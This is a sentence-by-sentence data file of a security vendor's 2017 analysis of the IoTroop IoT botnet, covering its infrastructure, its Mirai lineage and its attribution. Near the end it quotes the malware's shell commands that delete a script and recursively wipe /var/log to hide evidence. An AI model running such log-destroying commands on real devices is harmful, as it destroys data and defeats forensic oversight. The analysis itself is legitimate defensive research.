Number,Content
Sentence 1,"IOTROOP BOTNET: THE FULL INVESTIGATION
 October 29, 2017
 

Last week, thanks to the Check Point web sensor network, our researchers discovered a new and massive IoT Botnet, ‘IoTroop’."
Sentence 2,"Due to the urgency of this discovery, we quickly published our initial findings in order to alert the cyber security community."
Sentence 3,"Since then, we have had time to digest and dissect the propagating malware and share our findings with you."
Sentence 4,
Sentence 5,"
The main findings are:
• The entire attack infrastructure has been uncovered."
Sentence 6,"• We have observed 2 sets of different infrastructures:
o The main set of servers and samples focused on infection and propagation."
Sentence 7,o A smaller and different set used for 2nd stage payloads.
Sentence 8,• The attackers have quick and flexible control of infected device via LUA scripting.
Sentence 9,• The malware authors and operators are operating out of China.
Sentence 10,"Throughout the research, we found numerous indications that the authors and operators of this IoT Botnet are operating out of China."
Sentence 11,"Of course, all these indications can be forged."
Sentence 12,"However the sheer volume of evidence as well as locations, still leads us to conclude that these indications are true to a very high degree of probability."
Sentence 13,We can also reveal that part of the C&C infrastructure was previously registered under the email ‘li2384826402@yahoo.com’.
Sentence 14,This same email address was also used to register domains belonging to a Chinese APT Group dubbed ‘The Black Vine’.
Sentence 15,This is not strong enough to attribute this new botnet to the same group; however it does provide leads for future research.
Sentence 16,
Sentence 17,"
The Main Infrastructure

Based on a system multiple different servers, each with its own role to play in the reconnaissance, exploitation and delivery of the malware payload, the entire botnet propagation infrastructure has been uncovered."
Sentence 18,The diagram below illustrates an in-depth view of the requests made and the functions of each server.
Sentence 19,"Diagram of Malware Propagation Infrastructure

"
Sentence 20,"
IoTroop Malware Overview
The IoTroop malware is the main sample used in the campaign and is deployed as a first stage payload."
Sentence 21,It shares an extensive code base with the leaked Mirai source code which can be found in several online resources.
Sentence 22,"The main differences we observed are:

The C&C server has been completely redesigned to operate with a new backend."
Sentence 23,Additionally IoTroop’s C&C server is written in PHP while the original Mirai C&C server was written in GO.
Sentence 24,"With the change of the C&C backend, the C&C communication protocol was changed as well."
Sentence 25,The entire C&C communication functionality found within IoTroop’s samples is brand new and unique to the IoTroop malware.
Sentence 26,A vulnerability scanning functionality has replaced the original brute forcing password functionality as presented by Mirai.
Sentence 27,"This functionality has probably been added to enable the infection of a larger number of devices using fewer resources, while reducing the malware detection rates."
Sentence 28,The IoTroop malware does not contain any of the original Mirai DDoS functionalities; in fact it does not contain any DDoS functionality at all.
Sentence 29,"While we haven’t seen any actual DDoS attacks, all DDoS related actions are being orchestrated and managed by the C&C backend and is downloaded as separate modules."
Sentence 30,"Malware Operation Details
We have detected several variants of samples used by the IoTroop malware containing very slight differences but containing the exact same functionality."
Sentence 31,"Generally, all variants can be divided into two major categories correlating with the attacked device’s architecture – MIPS variants and ARM variants."
Sentence 32,"Initialization
Once IoTroop executes its payload onto an infected device, the initial steps of operation are equivalent to those taken by Mirai."
Sentence 33,"These include:

Obfuscated string initialization
Preventing reboot by the system`s watchdog service (By sending a specific IOCTL)
Ensurse only a single instance of IoTroops is currently running
Hide argv[0]
Hide process’s name
However, from this point of the control flow the IoTroop malware begins to execute its own unique functionality:

The device`s MAC address is retrieved and stored by sending IOCTL 0x8927 to the eth0, br0, eth1 and eth2 devices."
Sentence 34,
Sentence 35,"
If the device the malware is currently running on runs the GoAhead embedded web server, the following shell command lines are executed:

rm -f /tmp/ftpupload.sh \n
ln -s /dev/null /tmp/ftpupload.sh \n
rm -r /var/log \n

These actions are used to delete a previous shell script used by the WIFICAM exploit and to create a symbolic link to /dev/null, thus preventing any further attempts of using it, as well as clearing all log files to clear its evidence from the device."
Sentence 36,
